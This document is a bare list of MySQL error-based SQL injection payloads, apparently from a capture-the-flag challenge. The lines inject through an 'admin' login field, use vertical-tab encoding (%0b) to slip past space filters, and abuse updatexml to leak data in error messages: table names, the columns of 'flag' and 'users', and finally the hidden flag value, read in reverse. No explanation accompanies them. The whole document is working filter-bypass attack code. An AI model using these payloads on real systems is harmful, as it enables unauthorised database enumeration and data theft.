admin"%0bXOR%0bupdatexml(1,concat(0x7e,(SELECT%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bWHERE%0btable_schema=DATABASE()),0x7e),1)#


admin"%0bXOR%0bupdatexml(1,concat(0x7e,(SELECT%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bWHERE%0btable_name="flag"),0x7e),1)#

admin"%0bXOR%0bupdatexml(1,concat(0x7e,(SELECT%0bgroup_concat(flag)%0bfrom%0bflag),0x7e),1)#

admin"%0bXOR%0bupdatexml(1,concat(0x7e,group_concat((SELECT%0bcolumn_name%0bfrom%0binformation_schema.columns%0bWHERE%0btable_name="users"%0bINTERSECT%0bSELECT%0bcolumn_name%0bfrom%0binformation_schema.columns%0bWHERE%0bcolumn_name%0bregexp%0b"^real")),0x7e),1)#

admin"XORupdatexml(1,concat(0x7e,(SELECTcount(real_flag_1s_here)fromuserswherereal_flag_1s_here!="xxx"),0x7e),1)#

admin"XORupdatexml(1,concat(0x7e,REVERSE((SELECTreal_flag_1s_herefromuserswherereal_flag_1s_here!="xxx")),0x7e),1)#